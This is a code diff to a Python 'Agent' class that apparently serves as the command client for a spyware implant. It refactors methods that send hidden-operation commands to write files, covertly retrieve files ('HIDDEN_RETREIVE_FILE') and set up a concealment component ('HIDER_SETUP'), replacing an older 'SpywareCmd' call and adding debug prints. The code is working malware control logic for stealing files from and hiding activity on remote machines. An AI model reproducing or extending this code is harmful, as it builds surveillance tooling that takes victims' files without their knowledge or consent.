@@ -32,15 +32,21 @@ class Agent:
 
         with self.connect() as conn:
             conn.send_command(
-                Command(len(fileContent), FunCode.WRITE_FILE, targetFileName)
+                Command(len(fileContent), FunCode.WRITE_FILE, 0, targetFileName)
             )
             conn.send_data(fileContent)
             return conn.recv_responce_struct()
 
     def retrieve_file(self, fileName) -> tuple[Responce, bytes]:
         with self.connect() as conn:
-            conn.send_data(SpywareCmd(3, 0, 0))
-            conn.send_string(fileName)
+            conn.send_data(
+                Command(
+                    0,
+                    FunCode.HIDDEN_OPRATION | FunCode.HIDDEN_RETREIVE_FILE,
+                    0,
+                    fileName,
+                )
+            )
             file_data = conn.recv_file()
             res = conn.recv_responce_struct()
             return res, file_data
@@ -67,18 +73,25 @@ class Agent:
         with self.connect() as conn:
             conn.send_command(
                 Command(
-                    len(fileContent), FunCode.HIDDEN_OPRATION | fncode, targetFileName
+                    len(fileContent),
+                    FunCode.HIDDEN_OPRATION | fncode,
+                    0,
+                    targetFileName,
                 )
             )
             conn.send_data(fileContent)
             results = list()
+            print(f"{results=}")
             results.append(conn.recv_responce_struct())
+            print(f"{results=}")
             results.append(conn.recv_responce_struct())
+            print(f"{results=}")
             results.append(conn.recv_responce_struct())
+            print(f"{results=}")
             return conn.recv_full_responce(), results
 
     # prob redundant in future
     def hider_setup(self, hiderPath: str) -> Responce:
         with self.connect() as conn:
-            conn.send_command(Command(0, FunCode.HIDER_SETUP, hiderPath))
+            conn.send_command(Command(0, FunCode.HIDER_SETUP, 0, hiderPath))
             return conn.recv_responce_struct()
